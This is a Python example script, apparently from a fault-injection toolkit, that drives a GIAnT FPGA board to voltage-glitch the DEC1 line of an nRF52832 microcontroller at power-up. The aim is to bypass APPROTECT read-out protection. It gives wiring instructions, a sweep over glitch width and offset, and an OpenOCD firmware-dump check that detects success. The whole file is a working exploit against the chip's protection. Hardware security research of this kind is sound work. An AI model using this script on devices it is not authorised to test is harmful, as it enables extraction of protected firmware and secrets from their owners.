"""
This example shows how to glitch the loading of APPROTECT from the UICR (in flash)
to bypass CRP on the nRF52832.
Based on example_lpc1343.py in this repo.

For this to work, the following connections are needed:

- Solder a wire to DEC1 on the nRF and connect it to T1 on the GIAnT
  (T1 shorts to ground when the fault is injected).
- It may be necessary to remove the capacitor on DEC1.
- Connect VCC on the nRF to DAC output on the GIAnT, and GND to GND.
- Connect SWDIO and SWDCLK on the nRF to those pins on an ST-LINK or
  similar.

**IMPORTANT NOTE**: Make sure you have
https://github.com/openocd-org/openocd/blob/master/tcl/target/nrf52.cfg
in the directory you're running this from.
You'll need OpenOCD installed for the CRP check command to work.

Example success:
    Attempting to glitch...
    w = 180, o = 1071000, repeat = 1
    Protected! Next parameter.
    Attempting to glitch...
    w = 180, o = 1071000, repeat = 2
    Success!
    w = 180, o = 1071000
"""

import time
import serial as ser
import uu
from glitcher import glitcher
import logging
from fpga import *
from gpio import gpio
import subprocess


def checkProtected():
    """
    Returns True if the uc is still protected, or False if it isn't.

    Attempts to dump the firmware to nrf52_dump.bin and then reads the
    first four bytes to check whether it is a non-empty dump, in which
    case it will return False.
    """
    try:
        output = subprocess.check_output(
            [
                'openocd', '-f', 'interface/stlink.cfg',
                '-f', 'nrf52.cfg', '-c',
                'init;dump_image nrf52_dump.bin 0x0 0x1000;exit'
            ],
            stderr=subprocess.STDOUT
        )
        with open("nrf52_dump.bin", "rb") as f:
            if f.read(4) != b"\x00\x00\x00#":
                return False
            return True
    except Exception as e:
        print(e)
        pass
    return True


def main():
    """
    Iterate over the parameter search space and inject a voltage glitch.

    The uc is reset before every voltage glitch by disabling and then enabling
    the DAC.
    The trigger (start of the glitch offset period) is the DAC being enabled,
    so the glitch is triggered every time the uc starts receiving power.

    `enable DAC -> wait for the offset period -> short T1 to GND`
    """
    logging.basicConfig(level = logging.INFO)

    gl = glitcher()
    gl.resetFpga() 
    gl.dac.setTestModeEnabled(0)
    gl.dac.setRfidModeEnabled(0)
    
    io = gpio()

    # Trigger when DAC power high (uc VCC high)
    gl.dac.setTriggerEnableState(
        Register_Bits.FI_TRIGGER_CONTROL_DAC_POWER.value,
        True
    )
    
    # Offsets
    offset_start = 1050000
    offset_end = 1309000
    offset_step = 1000
    
    # Width range
    w_start = 100
    w_end = 250
    w_step = 10
    
    # Repeat each attempt how many times?
    repeat = 2
    
    # Loop state
    run = True
    w = w_start
    offset = offset_start
    r = 0

    # Both fault voltage and normal voltage are 3.3V.
    # We want the fault on T1, not on DAC power.
    gl.setVoltages(3.3, 3.3, 0)
    gl.dac.setEnabled(False)

    while run:
        print("Attempting to glitch...")
        print("w = {:d}, o = {:d}, repeat = {:d}".format(w, offset, r))
        # Turn off uc
        gl.dac.setEnabled(False)
        time.sleep(0.05)
        
        # Clean up any previous pulses
        gl.dac.clearPulses()
    
        # Set a pulse
        gl.addPulse(offset, w)
        
        # Arm the fault
        gl.dac.arm()
        
        # Bring uc out of reset. This will also trigger the glitch
        gl.dac.setEnabled(True)
        time.sleep(0.05)
        
        # Now check if we succeeded
        protected = checkProtected()
        
        if protected:
            print("Protected! Next parameter.")
            
            # Next param
            if r < repeat:
                r = r + 1
            elif w < w_end:
                r = 0
                w = w + w_step
            elif offset < offset_end:
                w = w_start
                offset = offset + offset_step
            else:
                run = False
        elif not protected:
            print("Success!")
            print("w = {:d}, o = {:d}".format(w, offset))
            run = False
    
    gl.close()


if __name__=="__main__":
    main()
